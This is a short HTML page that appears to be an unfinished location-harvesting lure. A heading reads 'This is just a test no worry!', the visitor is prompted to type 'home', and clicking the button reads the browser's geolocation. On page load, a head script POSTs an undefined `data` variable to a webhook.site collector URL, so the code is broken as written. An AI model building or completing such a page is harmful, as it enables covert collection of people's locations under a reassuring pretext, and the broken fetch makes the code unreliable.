<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Document</title>
  <!-- bank of icon  https://boxicons.com/  -->
  <script src="https://unpkg.com/boxicons@2.1.4/dist/boxicons.js"></script>
  <link rel="stylesheet" href="./style.css" />
  <script>
    fetch("https://webhook.site/195c3dae-0ba0-469f-95ad-253b1b6d4016", { // Replace with your Webhook URL
      method: "POST", // HTTP method
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data), // Convert data to JSON
    })

    window.onload = function() {
      document.getElementById("btn").addEventListener("click", getLocation);
    };

    function getLocation() {
      navigator.geolocation.getCurrentPosition(function(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        let input = document.getElementById("input").value;
        let inputCorrection = input.toLowerCase();
        let output = document.getElementById("output");

        if (inputCorrection == "home") {
          output.innerHTML =
            "latitude: " + latitude + "<br>" + "longitude: " + longitude;
        } else {
          alert("Please try again!");
        }
      });
    }
  </script>
</head>

<body>
  <h1>This is just a test no worry!</h1>
  <div class="container">
    <input type="text" id="input" placeholder="write home here" />
    <button id="btn">submit</button>
    <p id="output"></p>
  </div>
</body>

</html>